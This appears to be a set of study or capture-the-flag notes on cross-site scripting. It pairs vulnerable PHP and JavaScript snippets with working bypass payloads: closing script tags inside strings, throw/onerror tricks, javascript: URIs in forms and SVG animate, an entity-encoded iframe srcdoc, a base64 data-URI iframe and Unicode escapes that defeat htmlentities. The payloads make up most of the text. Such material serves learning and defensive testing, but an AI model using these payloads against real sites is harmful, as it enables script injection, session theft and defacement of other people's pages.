# Some of Xss context Location 

```
<html>
	
	<head>
		<script>
			const test = "CONTEXT-1";
		</script>
	</head>

	<body>
		<svg height="400" width="400">
			<text fill="#e2e2e2">CONTEXT-2</text>
		</svg>
	
		<form action="" >
			<input type="text" value="CONTEXT-3" />
		</form>

	</body>

</html>

```

XSS should be encoded according to context they are placed in, so CONTEXT-1 payload should be properly htmlencoded whereas not same for context-2.


* `/` is space in HTML. `<sv/g> = <sv g>`

# Attacks

1.

Question :
(Context-1)(only escaping ' and ")

```
<?php
// Can you spot the xss ?
 
$username = isset($_GET["username"]) ? $_GET["username"] : "guest";
$username = addslashes($username);
?>
<body>
<script>
 const username = '<?=$username?>';
 document.body.innerText = `Hello ${username} !`;
</script>

```

Sol:

```
<!-- The HTML parser is not JS aware, that means it will close the Js block at the first occurence of /script> even if its inside string -->

<script>
	const test = "</script>"; // script is closed here
</script>

<!-- to exploit above code u just need to close the script tag by sending username as </script> and use any basic xss payload. so if username = "</script><svg onload=alert`1`>"; -->

<script>
	const username = "</script><svg onload=alert`1`>";
	document.body.innerText = `Hello ${username} !`;
</script>

```

2.

Question :
(context-1)(escaping many invalid chars `()[]<>\'"` )

```
<?
$input = $_GET['input'];
$blacklist = str_split('()[]<>\'"`');

foreach($blacklist as $c){
	if(strpos($input, $c) !== false){
		die("nop");
	}
}

?>

<script>
const age = <?= $input ?>;
</script>

```

SOl:
```
<!-- So input cannot have set of things and if it doesnt, its directly inserted to script. So a simple input=23;alert(1); would have worked if no blacklist .-->
Bypasses can be

* age=23;{onerror=alert}throw 23//
* age=19;location=/javascript:alert%25281%2529/.source;

```

3.

Question:
(context-1)(XSS-auditor of chrome helps)
```
<script>var x=23;</script>

<script>
	if(!x || typeof x==="undefined"){
		alert("But how")?
	}
</script>
```

SOL:
```
<!-- As we know chromes xss auditor can simply `ignore/stops` execution of script if its same in URL we can use it -->

site.com/?x=<script>var x=23;</script>
```

4.

Question:
(context-2)(`<x onxxx=>` is filtered)

```
userInput = req.params("query");

if ( userInput.match(/<.*on.*=.*>/) || userInput.match("<script>") ){
	return "Error";
}

docuement.innerHTML = userInput;
``` 

SOl:
```
<!-- So this is one hard filter. <img> tag works fine, even <img onerror> is fine but it just dont allow you to have it like '<img onerror=' .The filter is very hard we can use some newlines and \ to bypass . -->


userInput as following are giving xss:
* <form action=javascript:alert(1)><input type=submit>  # donot use onxxx at all, use src=javascript:alert
* <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&> # same using src=js trick, this gives alert on click 


* <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>  # this is one tricky bypass

```

5.

Question:
(context-3)(scipt,on[a-z]+,style : are not allowed in the userInput)

```
userInput = req.params("query");

userInput = userInput.replace(	/script/gi   	,	"xscript");
userInput = userInput.replace(	/on[a-z]+=/ig	,	"onxxx=");
userInput = userInput.replace(	/style=/gi   	,	"stxxx=");

document.innerHTML = "<svg " + userInput + ">"

```

Solution:

```
"><a href=javas&#99;ript:alert(1)>click

"><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>  # works on firefox(parent.alert); dont know why cross origin is allowed in firefox


```

6.

Question :
(context-1)(escaping htmlentites which encode \<>'" or any character very properly )

```
<script>docuement.write("<?php echo htmlentities($_GET['x']); ?>"); </script>
```

Solution:
```
<!-- Unicode to the rescue  -->

\x3cimg src\x3dx \x3e
```


7.

Question:( NO SOLUTION YET)
(context-3)(' " < > whiteSpace newLine  `character from 0x00 to 0x20` all are blocked )


```
userInput = req.params("query");

userInput = userInput.replace(	/[\x00-\x20\<\>\"\']/gi   	,	"");

document.innerHTML = "<input value = '" + userInput + "'>"

```



